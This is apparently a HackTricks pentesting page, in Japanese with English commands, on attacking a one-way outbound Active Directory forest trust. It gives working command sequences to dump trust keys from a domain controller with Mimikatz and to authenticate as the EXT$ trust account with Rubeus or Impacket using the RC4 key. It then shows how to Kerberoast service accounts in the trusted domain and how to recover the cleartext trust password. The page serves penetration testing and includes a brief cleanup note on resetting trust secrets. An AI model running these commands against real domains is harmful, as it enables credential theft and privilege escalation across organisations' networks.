# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

このシナリオでは、**your domain** が **different domain/forest** のプリンシパルに対して、いくつかの**privileges** を **trusting** しています。

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
AD module が利用できるなら、**Trusted Domain Object (TDO)** も直接確認してください。これにより、生の LDAP-backed trust data を取得でき、後で easy path が **FSP/group abuse** なのか **trust-account abuse** なのかを判断する際に必要になります:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
また、`CN=ForeignSecurityPrincipals` からの foreign principals が実際にどこでアクセス権を付与されていたかも列挙すべきです。よくある成功例は次のとおりです。

- 現在の domain の server/DC 上の **Local admin**
- users/computers/GPOs に対する ACL を持つ **custom domain group** への所属
- **computer objects** を変更する権限。これにより、trust configuration が許せば後で [RBCD](resource-based-constrained-delegation.md) に発展する可能性がある

## Trust Account Attack

domain/forest **B** から domain/forest **A** へ一方向の trust が作成されると（**B trusts A**）、**B** 用の **trust account** が **A** に作成されます。outbound-trust の観点で **A** を見ると、これは重要です。というのも、後で **B**（trusting side）を compromise した場合、そこから trust secret を dump して、`B$` として **A** に再認証できるからです。

ここで理解すべき重要な点は、その trust account の password と Kerberos material は、**trusting** domain の Domain Controller から次の方法で抽出できるということです：
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
これは、**trusted** ドメイン内に作成された trust account が有効な principal であり、そのドメイン内で通常の domain user の基本権限を持つことになるためです。これは、LDAP の列挙を開始し、ticket を要求し、次の escalation path を見つけるのに十分なことがよくあります。

`ext.local` が **trusting** ドメインで、`root.local` が **trusted** ドメインである scenario では、`EXT$` という user account が `root.local` 内に作成されます。`ext.local` から trust keys をダンプすると、`root.local\EXT$` として `root.local` に対して使用できる credentials が明らかになります:
```bash
lsadump::trust /patch
```
これに続いて、抽出した**RC4**キーを使って `root.local` 内で `root.local\EXT$` として認証します:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
次に、その principal として trusted domain を列挙します。たとえば、`root.local` の高価値な SPN を Kerberoasting することで:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linuxから

**RC4** trust-account key を取得できたなら、同じ考え方は Linux でも Impacket で使えます:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
**RC4** が受け入れられない場合は、復旧した **cleartext password**（または派生した **AES** keys）に切り替え、そこから通常の [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) と [Kerberoast](kerberoast.md) のワークフローを再利用します。

### Key material の注意点

**trust keys** と **trust-account credentials** を混同しないでください:

- one-way trust では、両側が **TDO** を保存しますが、実際の **`EXT$` user account は trusted domain 側にのみ存在**します。
- 現在の trust-account password は、TDO trust secret（`NewPassword` / current trust key）に反映されます。
- **RC4** trust key は、trust account として `asktgt` に再利用するのに最も扱いやすい artefact です。default setup では、trust account に `msDS-SupportedEncryptionTypes` が空であることが多いため、たいていこの enctype が動作します。
- **AES trust keys** を使う場合は、salt が異なるため trust-account の AES keys と互換ではないことに注意してください。

したがって、このページの technique では、ダンプした **RC4** material か、復旧した **cleartext** password のどちらかを優先してください。

### cleartext trust password の取得

前の flow では、**cleartext password** の代わりに trust hash を使っていました（これは **mimikatz** でもダンプされます）。

cleartext password は、mimikatz の `\[ CLEAR ]` output を hexadecimal から変換し、null bytes `\x00` を削除することで取得できます:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

trust relationship を作成するとき、場合によっては trust 用の password を user が入力する必要があります。この demonstration では、key は元の trust password なので、人間が読める形式です。key が rotate されると（default: 30 日ごと）、cleartext は通常は人間が読めなくなりますが、技術的にはまだ利用可能です。

cleartext password は、trust account の Kerberos secret key を使って TGT を要求する代わりに、trust account として通常の authentication を行うために使えます。ここでは、`ext.local` から `root.local` を問い合わせて `Domain Admins` の member を取得しています:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### 実用上の制限

> [!WARNING]
> Trust accounts は扱いにくい principal です。**RUNAS / console / RDP** のような interactive logon は想定された経路ではなく、**NTLM** authentication の試行は `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` で失敗することがあります。代わりに **Kerberos network logons**（`asktgt`, LDAP, CIFS, Kerberoast`）を前提にしてください。

### Persistence / cleanup の注意

防御側が trusting domain の侵害に気づいた場合、`netdom trust ... /resetOneSide ...` で **両側** の trust secret を rotate する必要があります。運用者の観点では、これは **manual reset が古い trust material を即座に無効化する** 一方で、通常の trust-password rotation ではロールオーバー中に current/previous の値が残るため重要です。
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## 参考文献

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
